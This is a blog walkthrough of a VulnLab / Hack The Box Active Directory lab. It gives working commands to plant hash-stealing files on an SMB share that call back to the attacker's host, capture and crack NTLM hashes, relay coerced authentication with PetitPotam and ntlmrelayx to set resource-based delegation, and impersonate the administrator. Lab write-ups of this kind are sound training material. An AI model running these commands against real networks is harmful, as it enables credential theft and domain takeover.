<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; WalkthroughIntroductionThis is a comprehensive writeup and walkthrough for the Intercept Chain, a Chain &#x2F; ProLab from VulnLab &#x2F; Ha">
<meta property="og:type" content="article">
<meta property="og:title" content="VL-Intercept">
<meta property="og:url" content="https://panosoikogr.github.io/2025/11/16/VL-Intercept/index.html">
<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
<meta property="og:description" content="Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; WalkthroughIntroductionThis is a comprehensive writeup and walkthrough for the Intercept Chain, a Chain &#x2F; ProLab from VulnLab &#x2F; Ha">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://panosoikogr.github.io/images/Intercept/shares-ws.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Intercept/dev-share-hash.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Intercept/simon-bowen.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Intercept/vincent-woods-path.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Intercept/maq10.png">
<meta property="article:published_time" content="2025-11-16T12:43:02.000Z">
<meta property="article:modified_time" content="2025-11-16T12:50:09.498Z">
<meta property="article:author" content="Panosoiko">
<meta property="article:tag" content="Chains">
<meta property="article:tag" content="Hack The Box">
<meta property="article:tag" content="ProLab">
<meta property="article:tag" content="VulnLab">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://panosoikogr.github.io/images/Intercept/shares-ws.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>VL-Intercept</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-73BMC8ZHB7');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 8.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/11/21/CVE-2025-33073/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/11/VL-Tengu/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/16/VL-Intercept/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&text=VL-Intercept"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&is_video=false&description=VL-Intercept"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Intercept&body=Check out this article: https://panosoikogr.github.io/2025/11/16/VL-Intercept/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&title=VL-Intercept"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&name=VL-Intercept&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/16/VL-Intercept/&t=VL-Intercept"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intercept-Chain-VulnLab-Hack-The-Box-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Target-Information"><span class="toc-number">1.2.1.</span> <span class="toc-text">Target Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC01"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - DC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-WS01"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - WS01</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration-Relay-Target-Identification"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration &amp; Relay Target Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capturing-NTLM-Hashes"><span class="toc-number">1.4.</span> <span class="toc-text">Capturing NTLM Hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration-with-BloodHound"><span class="toc-number">1.5.</span> <span class="toc-text">Active Directory Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Findings"><span class="toc-number">1.5.1.</span> <span class="toc-text">Key Findings</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebClient-Service-Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">WebClient Service Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Strategy"><span class="toc-number">1.6.1.</span> <span class="toc-text">Attack Strategy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-Up-the-RBCD-Attack-Chain"><span class="toc-number">1.7.</span> <span class="toc-text">Setting Up the RBCD Attack Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Configure-DNS"><span class="toc-number">1.7.1.</span> <span class="toc-text">Step 1: Configure DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2-Create-a-Machine-Account"><span class="toc-number">1.7.2.</span> <span class="toc-text">Step 2: Create a Machine Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Setup-NTLM-Relay"><span class="toc-number">1.7.3.</span> <span class="toc-text">Step 3: Setup NTLM Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-4-Coerce-Authentication"><span class="toc-number">1.7.4.</span> <span class="toc-text">Step 4: Coerce Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-5-Request-Service-Ticket"><span class="toc-number">1.7.5.</span> <span class="toc-text">Step 5: Request Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-6-Dump-Credentials"><span class="toc-number">1.7.6.</span> <span class="toc-text">Step 6: Dump Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extracting-Credentials"><span class="toc-number">1.8.</span> <span class="toc-text">Extracting Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-CA-MANAGERS-Group"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation via CA-MANAGERS Group</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-ESC7-Active-Directory-Certificate-Services"><span class="toc-number">1.10.</span> <span class="toc-text">Exploiting ESC7 - Active Directory Certificate Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-CA-Configuration"><span class="toc-number">1.10.1.</span> <span class="toc-text">Vulnerable CA Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC7-Exploitation-Steps"><span class="toc-number">1.11.</span> <span class="toc-text">ESC7 Exploitation Steps</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Add-Simon-as-an-Officer"><span class="toc-number">1.11.1.</span> <span class="toc-text">Step 1: Add Simon as an Officer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2-Request-a-SubCA-Certificate"><span class="toc-number">1.11.2.</span> <span class="toc-text">Step 2: Request a SubCA Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Issue-the-Failed-Certificate"><span class="toc-number">1.11.3.</span> <span class="toc-text">Step 3: Issue the Failed Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-4-Retrieve-the-Issued-Certificate"><span class="toc-number">1.11.4.</span> <span class="toc-text">Step 4: Retrieve the Issued Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-5-Authenticate-and-Obtain-Administrator-Hash"><span class="toc-number">1.11.5.</span> <span class="toc-text">Step 5: Authenticate and Obtain Administrator Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-Access"><span class="toc-number">1.12.</span> <span class="toc-text">Final Access</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        VL-Intercept
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Panosoiko</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-16T12:43:02.000Z" class="dt-published" itemprop="datePublished">2025-11-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Chains/" rel="tag">Chains</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Intercept-Chain-VulnLab-Hack-The-Box-Writeup-Walkthrough"><a href="#Intercept-Chain-VulnLab-Hack-The-Box-Writeup-Walkthrough" class="headerlink" title="Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; Walkthrough"></a>Intercept Chain - VulnLab &#x2F; Hack The Box Writeup &amp; Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a comprehensive writeup and walkthrough for the <strong>Intercept Chain</strong>, a Chain &#x2F; ProLab from VulnLab &#x2F; Hack The Box that focuses on Active Directory exploitation techniques. This challenge tests your skills in NTLM relay attacks, RBCD (Resource-Based Constrained Delegation), WebClient exploitation, and Active Directory Certificate Services (AD CS) vulnerabilities. This walkthrough will guide you through the complete attack chain from initial access to domain administrator privileges.</p>
<hr>
<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Target-Information"><a href="#Target-Information" class="headerlink" title="Target Information"></a>Target Information</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.144.229 dc01.intercept.vl</span><br><span class="line">10.10.144.230 ws01.intercept.vl</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-Scan-DC01"><a href="#Nmap-Scan-DC01" class="headerlink" title="Nmap Scan - DC01"></a>Nmap Scan - DC01</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack</span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INTERCEPT</span><br><span class="line">|   NetBIOS_Domain_Name: INTERCEPT</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: intercept.vl</span><br><span class="line">|   DNS_Computer_Name: DC01.intercept.vl</span><br><span class="line">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">52789/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">52796/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">52819/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">52841/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-Scan-WS01"><a href="#Nmap-Scan-WS01" class="headerlink" title="Nmap Scan - WS01"></a>Nmap Scan - WS01</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">135/tcp  open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INTERCEPT</span><br><span class="line">|   NetBIOS_Domain_Name: INTERCEPT</span><br><span class="line">|   NetBIOS_Computer_Name: WS01</span><br><span class="line">|   DNS_Domain_Name: intercept.vl</span><br><span class="line">|   DNS_Computer_Name: WS01.intercept.vl</span><br><span class="line">5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>From the scans, we identify a standard domain controller (DC01) and a workstation (WS01). Given the lab’s name “Intercept,” we can anticipate that NTLM relay attacks will be a key component of this challenge.</p>
<hr>
<h2 id="SMB-Enumeration-Relay-Target-Identification"><a href="#SMB-Enumeration-Relay-Target-Identification" class="headerlink" title="SMB Enumeration &amp; Relay Target Identification"></a>SMB Enumeration &amp; Relay Target Identification</h2><p>First, let’s identify potential relay targets:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.144.229-230 --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>

<p>The results show that only WS01 is vulnerable to relay attacks. Next, we check for null authentication on SMB shares:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.144.229</span><br><span class="line">smbclient -L //10.10.144.230</span><br></pre></td></tr></table></figure>

<p><img src="/images/Intercept/shares-ws.png" alt="SMB Shares on WS01"></p>
<p>Accessing the <code>dev</code> share reveals multiple files:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.144.230/dev</span><br></pre></td></tr></table></figure>

<p>We discover a README file with the following content:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please check this share regularly for updates to the application (this is a temporary solution until we switch to gitlab).</span><br></pre></td></tr></table></figure>

<p>Within the <code>project</code> folder, there’s a <code>kernel_driver</code> subdirectory containing another README:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Driver still in development, coming soon.</span><br></pre></td></tr></table></figure>

<p>Since we have write access to this share, we can leverage it to capture NTLM hashes by planting malicious files.</p>
<hr>
<h2 id="Capturing-NTLM-Hashes"><a href="#Capturing-NTLM-Hashes" class="headerlink" title="Capturing NTLM Hashes"></a>Capturing NTLM Hashes</h2><p>We’ll use the <code>ntlm_theft</code> tool to generate files that will force authentication back to our machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py --generate all --server &lt;Your IP&gt; -f kernel_driver</span><br></pre></td></tr></table></figure>

<p>Start Responder in another terminal:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>

<p>Navigate to the folder created by the tool, start an SMB session, and upload all files:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; recurse ON</span><br><span class="line">smb: \&gt; prompt OFF</span><br><span class="line">smb: \&gt; mput *</span><br></pre></td></tr></table></figure>

<p>Within seconds, we capture an NTLMv2 hash:</p>
<p><img src="/images/Intercept/dev-share-hash.png" alt="Captured Hash"></p>
<p>Crack the hash using hashcat:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>The hash cracks successfully:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kathryn.spencer:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Active-Directory-Enumeration-with-BloodHound"><a href="#Active-Directory-Enumeration-with-BloodHound" class="headerlink" title="Active Directory Enumeration with BloodHound"></a>Active Directory Enumeration with BloodHound</h2><p>Now that we have valid credentials, let’s gather AD information using BloodHound:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.intercept.vl -u kathryn.spencer -p &lt;PASS&gt; --bloodhound --dns-server 10.10.144.229 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>

<h3 id="Key-Findings"><a href="#Key-Findings" class="headerlink" title="Key Findings"></a>Key Findings</h3><p><img src="/images/Intercept/simon-bowen.png" alt="Simon Bowen Information"></p>
<p><img src="/images/Intercept/vincent-woods-path.png" alt="Vincent Woods Attack Path"></p>
<p>The user <code>kathryn.spencer</code> can enroll up to 10 machines into the domain:</p>
<p><img src="/images/Intercept/maq10.png" alt="Machine Account Quota"></p>
<p>While no vulnerable certificate templates are immediately exploitable from a machine account, this capability will be crucial for exploiting RBCD once we obtain access to <code>Vincent.Woods</code>.</p>
<hr>
<h2 id="WebClient-Service-Exploitation"><a href="#WebClient-Service-Exploitation" class="headerlink" title="WebClient Service Exploitation"></a>WebClient Service Exploitation</h2><p>With limited privileges, we need to find an exploitation path. After researching, I found a technique involving the WebClient service for lateral movement:</p>
<p><strong>Reference:</strong> <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Lateral Movement: WebClient Workstation Takeover</a></p>
<p>First, verify if WebDAV is enabled on WS01:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.144.230 -u kathryn.spencer -p &lt;PASS&gt; -M webdav</span><br><span class="line">WebClient Service enabled on: 10.10.144.230</span><br></pre></td></tr></table></figure>

<h3 id="Attack-Strategy"><a href="#Attack-Strategy" class="headerlink" title="Attack Strategy"></a>Attack Strategy</h3><p>The attack path involves:</p>
<ol>
<li>Creating a new machine account</li>
<li>Adding a DNS entry pointing to our attack machine</li>
<li>Coercing authentication from WS01 (which has WebClient enabled)</li>
<li>Relaying the authentication to the DC via LDAP</li>
<li>Modifying <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on WS01 to enable RBCD</li>
<li>Impersonating a privileged user to compromise WS01</li>
</ol>
<p><strong>Additional RBCD Resources:</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">The Hacker Recipes - RBCD</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html">HackTricks - Resource-Based Constrained Delegation</a></li>
</ul>
<p><strong>Note:</strong> This attack requires LDAP signing to be disabled on the DC. If SMB signing were also disabled, we could relay directly to SMB, but in this case, LDAP is our only viable target.</p>
<hr>
<h2 id="Setting-Up-the-RBCD-Attack-Chain"><a href="#Setting-Up-the-RBCD-Attack-Chain" class="headerlink" title="Setting Up the RBCD Attack Chain"></a>Setting Up the RBCD Attack Chain</h2><h3 id="Step-1-Configure-DNS"><a href="#Step-1-Configure-DNS" class="headerlink" title="Step 1: Configure DNS"></a>Step 1: Configure DNS</h3><p>Before proceeding, modify <code>/etc/resolv.conf</code> (keep a backup of your original configuration):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search intercept.vl</span><br><span class="line">nameserver &lt;DC IP HERE&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Warning:</strong> You won’t be able to access the internet until you restore your original <code>/etc/resolv.conf</code>.</p>
<p>Add the DNS entry pointing to your attack machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnstool.py -u intercept.vl\\kathryn.spencer -p &#x27;&lt;PASS&gt;&#x27; -r pan.intercept.vl -d 10.8.0.36 --action add dc01.intercept.vl</span><br></pre></td></tr></table></figure>

<p><strong>Tool:</strong> <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx.git">krbrelayx</a></p>
<h3 id="Step-2-Create-a-Machine-Account"><a href="#Step-2-Create-a-Machine-Account" class="headerlink" title="Step 2: Create a Machine Account"></a>Step 2: Create a Machine Account</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer -computer-name &#x27;PAN02$&#x27; -computer-pass &#x27;HelloWorld123!&#x27; -dc-host dc01.intercept.vl -domain-netbios intercept &#x27;INTERCEPT/Kathryn.Spencer:&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="Step-3-Setup-NTLM-Relay"><a href="#Step-3-Setup-NTLM-Relay" class="headerlink" title="Step 3: Setup NTLM Relay"></a>Step 3: Setup NTLM Relay</h3><p>Configure ntlmrelayx to relay authentication and establish RBCD on WS01:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntlmrelayx.py -smb2support -t ldaps://dc01.intercept.vl --http-port 8080 --delegate-access --escalate-user PAN02\$ --no-dump --no-acl --no-da</span><br></pre></td></tr></table></figure>

<h3 id="Step-4-Coerce-Authentication"><a href="#Step-4-Coerce-Authentication" class="headerlink" title="Step 4: Coerce Authentication"></a>Step 4: Coerce Authentication</h3><p>Use PetitPotam to force WS01 to authenticate to our attack machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d intercept.vl -u &#x27;Kathryn.Spencer&#x27; -p &#x27;&lt;PASS&gt;&#x27; pan@8080/a ws01.intercept.vl</span><br></pre></td></tr></table></figure>

<p><strong>Tool:</strong> <a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam.git">PetitPotam</a></p>
<h3 id="Step-5-Request-Service-Ticket"><a href="#Step-5-Request-Service-Ticket" class="headerlink" title="Step 5: Request Service Ticket"></a>Step 5: Request Service Ticket</h3><p>After successfully relaying the authentication and configuring RBCD, request a service ticket for the CIFS service while impersonating the local administrator:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn cifs/ws01.intercept.vl intercept.vl/PAN02\$ -impersonate administrator</span><br></pre></td></tr></table></figure>

